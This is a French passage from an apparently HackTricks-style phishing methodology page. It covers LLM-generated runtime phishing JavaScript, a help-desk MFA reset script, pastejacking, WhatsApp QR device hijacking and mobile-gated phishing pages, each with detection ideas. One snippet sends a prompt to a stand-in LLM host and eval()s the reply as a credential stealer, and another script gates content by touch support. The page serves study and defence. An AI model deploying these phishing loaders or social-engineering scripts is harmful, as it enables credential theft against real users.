2. **Appel API côté client :** au chargement, le JS appelle un LLM public (Gemini/DeepSeek/etc.) ou un proxy CDN ; seul le prompt/l’appel API est présent dans le HTML statique.
3. **Assemblage et exécution :** concaténer la réponse et l’exécuter (polymorphe à chaque visite) :
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** le code généré personnalise l’appât (p. ex., parsing du token LogoKit) et envoie les identifiants à l’endpoint dissimulé dans le prompt.

**Caractéristiques d’évasion**
- Le trafic passe par des domaines LLM connus ou des proxies CDN réputés, parfois via des WebSockets vers un backend.
- Aucun payload statique ; le JS malveillant n’existe qu’après le rendu.
- Les générations non déterministes produisent des **stealers uniques** pour chaque session.

**Idées de détection**
- Exécuter des sandbox avec JS activé ; détecter **`eval` à l’exécution / la création dynamique de scripts provenant de réponses LLM**.
- Rechercher des POST front-end vers des API LLM immédiatement suivis de `eval`/`Function` sur le texte renvoyé.
- Déclencher une alerte concernant les domaines LLM non autorisés dans le trafic client, suivis de POST de credentials.

---

## Variante MFA Fatigue / Push Bombing – Réinitialisation forcée
En plus du push-bombing classique, les opérateurs **forcent simplement une nouvelle inscription MFA** pendant l’appel au support, ce qui rend le token existant de l’utilisateur inutilisable. Toute invite de connexion ultérieure semble légitime pour la victime.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Surveillez les événements AzureAD/AWS/Okta où **`deleteMFA` + `addMFA`** se produisent **à quelques minutes d’intervalle depuis la même adresse IP**.



## Détournement du presse-papiers / Pastejacking

Les attaquants peuvent copier silencieusement des commandes malveillantes dans le presse-papiers de la victime depuis une page web compromise ou typosquattée, puis inciter l’utilisateur à les coller dans **Win + R**, **Win + X** ou une fenêtre de terminal, ce qui permet d’exécuter du code arbitraire sans aucun téléchargement ni pièce jointe.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing mobile et distribution d’applications malveillantes (Android et iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Détournement de l’association d’un appareil WhatsApp via l’ingénierie sociale par QR code
* Une page piège (par exemple un faux « canal » d’un ministère ou d’un CERT) affiche un QR code WhatsApp Web/Desktop et demande à la victime de le scanner, ajoutant ainsi silencieusement l’attaquant comme **appareil associé**.<sup>[[12]](#references)</sup>
* L’attaquant obtient immédiatement une visibilité sur les discussions et les contacts jusqu’à la suppression de la session. Les victimes peuvent ensuite voir une notification indiquant qu’un « nouvel appareil a été associé » ; les défenseurs peuvent rechercher des événements d’association d’appareils inattendus peu après la consultation de pages QR non fiables.

### Phishing conditionné à l’utilisation d’un appareil mobile pour contourner les crawlers/sandboxes
Les opérateurs conditionnent de plus en plus leurs flux de phishing à une simple vérification de l’appareil afin que les crawlers desktop n’atteignent jamais les pages finales. Un schéma courant consiste en un petit script qui vérifie la présence d’un DOM compatible avec le tactile et envoie le résultat à un endpoint serveur ; les clients non mobiles reçoivent une réponse HTTP 500 (ou une page blanche), tandis que les utilisateurs mobiles voient s’afficher le flux complet.<sup>[[7]](#references)</sup>

Extrait client minimal (logique typique) :
```html
<script src="/static/detect_device.js"></script>
```
Logique de `detect_device.js` (simplifiée) :
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportement du serveur souvent observé :
- Définit un cookie de session lors du premier chargement.
- Accepte `POST /detect {"is_mobile":true|false}`.
- Renvoie 500 (ou un placeholder) aux GET suivants lorsque `is_mobile=false` ; ne sert le phishing que si `true`.

Heuristiques de hunting et de détection :
- Requête urlscan : `filename:"detect_device.js" AND page.status:500`
- Télémétrie Web : séquence `GET /static/detect_device.js` → `POST /detect` → HTTP 500 pour les appareils non mobiles ; les chemins légitimes des victimes mobiles renvoient 200 avec du HTML/JS supplémentaire.
- Bloquer ou examiner attentivement les pages qui conditionnent exclusivement leur contenu à `ontouchstart` ou à des vérifications similaires de l'appareil.

Conseils de défense :
- Exécuter les crawlers avec des fingerprints similaires à ceux d'appareils mobiles et avec JavaScript activé afin de révéler le contenu gated.
- Déclencher une alerte en cas de réponses 500 suspectes après `POST /detect` sur des domaines nouvellement enregistrés.

## References

- [1] [Générer des variations de domaines utilisées dans le phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Trouver le phishing : outils et techniques (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Voler des identifiants et contourner la 2FA avec noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Voler des sessions et contourner la 2FA avec EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Comment installer et configurer DKIM avec Postfix sur Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Rapport mondial 2025 de Unit 42 sur la réponse aux incidents – Édition ingénierie sociale](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – infrastructure de phishing gated par mobile et heuristiques (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [La nouvelle frontière des attaques par assemblage à l'exécution : exploiter les LLM pour générer du JavaScript de phishing en temps réel](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Usurpation d'identité, détournement de clics et TDS : au cœur d'un écosystème de distribution de malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting de Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Détournement du trafic vers le windows.com de Microsoft par bit flipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [L'amour ? En réalité : une fausse application de rencontre utilisée comme leurre dans une campagne de spyware ciblée au Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC et échantillons d'ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
